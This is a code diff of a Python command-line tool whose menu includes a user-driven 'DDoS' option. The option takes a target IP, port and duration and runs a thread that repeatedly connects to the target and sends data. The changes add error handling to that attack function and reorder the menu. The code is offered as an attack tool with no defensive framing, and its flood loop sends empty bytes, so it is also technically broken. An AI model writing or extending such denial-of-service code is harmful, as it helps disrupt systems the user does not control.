@@ -17,10 +17,13 @@ import threading
 init()
 
 def ddos_attack(ip, port, duration):
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.connect((ip, port))
-        for _ in range(duration * 100):
-            s.send(b'')
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.connect((ip, port))
+            for _ in range(duration * 100):
+                s.send(b'')
+    except TimeoutError:
+        print(f"Error: Unable to connect to {ip}:{port}. Please check the IP address and port number and try again.")
 
 def get_hwid():
     """Get a unique HWID based on the machine's hardware."""
@@ -372,13 +375,13 @@ def main_menu():
             password_security_menu()
         elif choice == '3':
             domain_dns_menu()
-        elif choice == '5':  # Added DDoS option
+        elif choice == '4':  # Added DDoS option
             target_ip = input("Enter target IP: ")
             target_port = int(input("Enter target port: "))
             duration = int(input("Enter attack duration (seconds): "))
             ddos_thread = threading.Thread(target=ddos_attack, args=(target_ip, target_port, duration))
             ddos_thread.start()
-        elif choice == '4':
+        elif choice == '5':
             print(colored("Exiting...", 'red'))
             break
         else:
